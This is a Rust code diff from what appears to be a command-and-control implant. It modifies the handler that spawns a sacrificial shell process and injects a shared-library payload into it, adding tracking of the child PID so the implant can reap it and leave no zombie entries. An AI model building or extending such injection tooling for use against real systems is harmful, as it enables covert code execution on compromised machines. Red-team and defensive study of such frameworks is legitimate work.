@@ -85,7 +85,10 @@ pub(super) async fn execute_spawn_dll(
 
     tracing::debug!(dll_size = dll_bytes.len(), "spawn dll/so");
 
-    let status = spawn_and_inject_so(&dll_bytes).await;
+    let (status, child_pid) = spawn_and_inject_so(&dll_bytes).await;
+    if let Some(pid) = child_pid {
+        state.track_injected_pid(pid);
+    }
 
     state.queue_callback(PendingCallback::Structured {
         command_id: u32::from(DemonCommand::CommandSpawnDll),
@@ -299,10 +302,16 @@ async fn inject_so_via_ptrace(pid: u32, so_path: &str) -> u32 {
 }
 
 /// Spawn a sacrificial process and inject a shared library into it.
-async fn spawn_and_inject_so(so_bytes: &[u8]) -> u32 {
+/// Returns `(status, child_pid)`.
+///
+/// `child_pid` is `Some` whenever a sacrificial process was successfully spawned,
+/// regardless of whether injection succeeded.  The caller must pass it to
+/// [`PhantomState::track_injected_pid`] so the check-in loop can reap the child
+/// via `waitpid(WNOHANG)` once it exits — preventing zombie `<defunct>` entries.
+async fn spawn_and_inject_so(so_bytes: &[u8]) -> (u32, Option<u32>) {
     if so_bytes.is_empty() {
         tracing::warn!("empty .so payload");
-        return INJECT_ERROR_FAILED;
+        return (INJECT_ERROR_FAILED, None);
     }
 
     let child = match Command::new("/bin/sh")
@@ -315,11 +324,12 @@ async fn spawn_and_inject_so(so_bytes: &[u8]) -> u32 {
         Ok(c) => c,
         Err(e) => {
             tracing::warn!(%e, "failed to spawn sacrificial process");
-            return INJECT_ERROR_FAILED;
+            return (INJECT_ERROR_FAILED, None);
         }
     };
 
     let child_pid = child.id();
 
-    inject_so_into_pid(child_pid, so_bytes).await
+    let status = inject_so_into_pid(child_pid, so_bytes).await;
+    (status, Some(child_pid))
 }
